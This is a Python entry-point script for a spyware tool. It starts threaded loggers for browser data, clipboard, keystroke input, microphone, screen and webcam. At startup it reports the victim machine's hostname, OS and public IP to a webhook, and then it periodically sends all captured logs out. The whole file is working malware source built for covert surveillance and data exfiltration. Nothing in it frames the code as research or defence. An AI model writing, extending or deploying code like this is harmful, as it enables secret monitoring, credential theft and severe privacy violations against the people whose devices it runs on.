import threading
import time
import platform
import requests

from config import SEND_LOGS_INTERVAL_SEC

from loggers.browser_logger import BrowserLogger
from loggers.clipboard_logger import ClipboardLogger
from loggers.input_logger import InputLogger
from loggers.microphone_logger import MicrophoneLogger
from loggers.screen_logger import ScreenLogger
from loggers.webcam_logger import WebcamLogger

from utils.file_utils import create_log_directories
from utils.logging_utils import log_error, send_logs
from utils.webhook_utils import send_message


def send_all_logs(loggers):
    while True:
        for logger in loggers:
            try:
                logger.send_logs()
            except FileNotFoundError:
                log_error("File not found error in send_logs")
            except Exception as e:
                log_error(f"Unexpected error in send_logs: {e}")
            time.sleep(1)
        send_logs()
        time.sleep(SEND_LOGS_INTERVAL_SEC)


def create_loggers():
    loggers = [
        BrowserLogger(),
        ClipboardLogger(),
        InputLogger(),
        MicrophoneLogger(),
        ScreenLogger(),
        WebcamLogger(),
    ]
    return loggers


def start_loggers(loggers):
    for logger in loggers:
        threading.Thread(target=logger.run).start()


def startup_message():
    ip = requests.get("https://checkip.amazonaws.com").text.strip()
    system_info = platform.uname()
    message = f"Started logging on {system_info.system} {system_info.release} ({system_info.version}) from {system_info.node} at IP: {ip}"
    send_message(message)


def main():
    startup_message()
    create_log_directories()
    loggers = create_loggers()
    start_loggers(loggers)
    threading.Thread(target=send_all_logs, args=(loggers,)).start()


if __name__ == "__main__":
    main()
